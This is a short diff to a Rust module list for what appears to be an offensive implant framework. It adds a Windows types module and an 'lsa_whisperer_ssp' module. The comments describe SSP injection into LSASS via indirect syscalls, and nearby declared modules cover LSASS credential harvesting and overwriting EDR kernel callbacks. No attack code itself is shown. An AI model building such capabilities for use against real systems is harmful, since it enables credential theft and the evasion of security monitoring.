@@ -6,6 +6,10 @@ pub mod process_manager;
 pub mod process_spoof;
 pub mod shell;
 
+/// Local Windows type definitions (replaces winapi type-only imports).
+#[cfg(windows)]
+pub mod win_types;
+
 #[cfg(windows)]
 pub mod token_manipulation;
 #[cfg(windows)]
@@ -127,6 +131,11 @@ pub mod lsass_harvest;
 // Guard and RunAsPPL.  Windows-only, gated by `lsa-whisperer`.
 #[cfg(all(windows, feature = "lsa-whisperer"))]
 pub mod lsa_whisperer;
+
+// SSP injection support for LSA Whisperer: position-independent stub builder,
+// shared memory IPC, and LSASS injection via indirect syscalls.
+#[cfg(all(windows, feature = "lsa-whisperer"))]
+pub mod lsa_whisperer_ssp;
 
 // Kernel callback overwrite (BYOVD): surgically overwrite EDR kernel callback
 // function pointers to point to a `ret` instruction instead of NULLing them.
